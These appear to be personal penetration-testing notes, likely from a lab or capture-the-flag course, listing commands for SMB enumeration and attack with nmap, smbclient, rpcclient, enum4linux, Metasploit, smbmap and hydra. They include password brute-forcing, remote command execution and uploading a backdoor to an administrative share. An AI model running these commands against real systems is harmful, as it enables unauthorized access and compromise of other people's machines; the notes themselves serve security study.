 enumeration 

- nmap -T4 $IP/20 --open 
- nmap $IP -T4 -sV -O 
- nmap $IP -sC -sV 
- nmap --script smb-os-discovery.nse -p445 $IP
    nmblookup -A $IP 
- smbclient -L $IP -N (null session} 
- rpcclient -U "" -N $IP
- enum4linux -U $IP
- msfconsole /scanner/smb/smb2
- msfconsole smb_enumshares 
- smbclient //192.5.121.3/Public -N | to connect to file that have the read and write permissions 
- msfconsole 
auxiliary/scanner/smb/smb_login | The smb_login module is used to bruteforce SMB remotely.
auxiliary/scanner/smb/pipe_auditor | The `pipe_auditor` scanner will determine what named pipes are available over SMB
- --script smb-protocols  | version information 

-------------------------------------

NMAP scripts for further enumaration 

--script smb-protocols  | version information 
--script smb-security-mode | acount used etc
--script smb-enum-sessions | who logged in 
--script smb-enum-sessions --script-args smbusername=admin , smbpassword=smbserver_771 | pass arguments 
--script smb-enum-shares | what do we have access to ? we can also add --script-args after authenticating to get better results of shares access 
--script smb-enum-users | to know which users exist we can parse --script-args
--script smb-server-stats | get server statistics we can parse --script-args [admin:pass]
--script smb-enum-domains | we could see users/passwords enum 
--script smb-enum-services | information specific to the service 
--script smb-enum-shares,smb-ls | will get shares and will run ls command on them with --script-args 

----------------------------------

SMBCLIENT 

- smbclient -L $IP -N (null session} 
- smbclient //192.5.121.3/Public -N | to connect to file that have the read and write permissions 
- smbclient //ip/jane -U jane
- smbclient //192.215.135.3/admin -U admin
//192.168.100.52/print$ Mapping: DENIED, Listing: N/A
//192.168.100.52/shared Mapping: OK, Listing: OK
//192.168.100.52/IPC$   [E] Can't understand response:

https://www.samba.org/samba/docs/current/man-html/smbclient.1.html

-------------------------------

RPCCLIENT 

- rpcclient -U "" -N $IP



RPCLIENT MAIN SITE 
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
RPCLIENT COMMANDS 
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration

-----------------------------

SMBMAP

- smbmap -H 192.168.1.1 -u admin -p password1 
- smbmap -u guest -p "" -d . -H 192.168.0.1 | user/pass/directory/host |will give us shares and    permissions 
- smbmap -u guest -p "" -d . -x 'ipconfig' -H 192.168.0.1 | added -x which runs command 
- smbmap -u guest -p "" -d . --upload '/root/backdoor' 'C$\\backdoor'-H 192.168.0.1
- smbmap -u guest -p "" -d . --download 'C$\\flag.txt'-H 192.168.0.1

https://github.com/ShawnDEvans/smbmap

-------------------------------------

BRUTEFORCE smb and unzip 

- hydra -l admin -P /rockyou.txt 192.168.1.1 smb 
- gzip -d | to uncompress a file 
- tar -xf | unzip tar 

------------------------------
- enum4linux -r -u "admin" -p password 192.168.1.1 

  | performing RID cycling with enum4linux 
  enum4linux --help | for more commands 